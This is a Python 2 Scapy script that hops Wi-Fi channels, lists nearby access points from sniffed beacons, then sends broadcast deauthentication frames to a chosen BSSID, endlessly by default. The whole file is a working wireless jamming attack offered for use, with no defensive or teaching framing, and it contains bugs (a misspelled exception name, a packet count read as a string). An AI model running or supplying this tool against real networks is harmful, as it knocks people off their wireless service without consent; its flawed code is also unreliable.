import argparse
from multiprocessing import Process
import signal
import random
from scapy.all  import *
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


def setArgs():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        '-i',
        '--interface',
        required=True,
        type=str,
        help=('Indicates the interface used to jamm')
    )

    parser.add_argument(
        '-aAp',
        '--allAccesspoints',
        help = ("Acts over all the available acces points"),
        action='store_true'    
    )

    return parser.parse_args()

def channel_hop(interface):
    counterChannel = 1
    while True:
        try:
            channel = random.randrange(1,13)
            os.system("iwconfig %s channel %d" % (interface, counterChannel))
            time.sleep(3)
            if counterChannel <= 12:
                counterChannel+=1
            else :
                counterChannel = 1
        except KeyboardInterrupt:
            break

def stopHopper(signal, frame):
    global stop_sniff
    stop_sniff = True
    print("Sniff Stoped ...")
    hopper.terminate()
    hopper.join()
    print("Channel hop stopped ...")

def add_network(pckt, known_networks):
    essid = pckt[Dot11Elt].info if '\x00' not in pckt[Dot11Elt].info  and pckt[Dot11Elt].info != '' else 'Hidden SSID'
    bssid = pckt[Dot11].addr3
    channel = int(ord(pckt[Dot11Elt:3].info))
    if bssid not in known_networks:
        known_networks[bssid] = (essid, channel)
        print "{0:5}\t{1:30}\t{2:30}".format(channel, essid, bssid)

def perform_deauth(bssid, client, count):
    pckt =  RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth()
    print("Sending Deauth to %s from %s" % (client, bssid))
    if count == -1: print("Press CTRL+C to quit")
    while count != 0:
        try: 
            for i in range (64):
                sendp(pckt, iface=args.interface, inter = .2 )
            count -=1
        except KeyboradInterrupt:
            break

if __name__ == "__main__":
    args = setArgs()
    networks = {}
    global stop_sniff
    stop_sniff = False
    print("Press CTRL+C to stop sniffing...")
    print("="*100 + '\n{0:5}\t{1:30}\t{2:30}\n'.format('Channel', 'ESSID','BSSID') + '='*100)
    hopper = Process(target= channel_hop, args=(args.interface,) )
    hopper.start()
    signal.signal(signal.SIGINT, stopHopper)
    sniff(
        iface = args.interface,
        lfilter = lambda x: (x.haslayer(Dot11Beacon) or x.haslayer(Dot11ProbeResp)), 
        stop_filter= lambda x: (stop_sniff), 
        prn = lambda x: add_network(x, networks) )

    signal.signal(signal.SIGINT, signal.SIG_DFL)
    target_accesspoint = raw_input('Enter a BSSID to perform a deauth attack(q to quit): ')
    while target_accesspoint not in networks:
        if target_accesspoint == 'q': sys.exit(0)
        target_accesspoint = raw_input("BSSID not founded, please verify (q to quit) :") 
    print("Setting interface  %s to channel %d "% (args.interface, networks[target_accesspoint][1]) ) 
    os.system("iwconfig %s channel %d" % (args.interface, networks[target_accesspoint][1]) )
    deauth_pckt_count = raw_input("Number of packets to send (default: infinite):") 
    if not deauth_pckt_count: deauth_pckt_count = -1
    perform_deauth(target_accesspoint, 'FF:FF:FF:FF:FF:FF', deauth_pckt_count)     
